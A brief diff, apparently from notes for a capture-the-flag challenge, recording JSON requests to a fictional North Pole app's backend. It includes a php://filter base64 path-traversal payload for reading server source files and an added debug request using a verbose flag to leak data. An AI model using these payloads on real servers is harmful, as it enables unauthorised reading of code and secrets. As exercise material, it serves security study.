@@ -240,3 +240,13 @@ Content-Length: 123
 	"operation": "ReadCrashDump",
 	"data" : { "crashdump": "php://filter/convert.base64-encode/resource=../exception" }
 }
+
+http://dev.northpolewonderland.com/index.php
+{
+	"date": "20161223140325-0500",
+	"udid": "88dadbb97a90b95e",
+	"debug":"com.northpolewonderland.santagram.EditProfile,EditProfile",
+	"freemem":251108256,
+	"verbose":true
+}
+
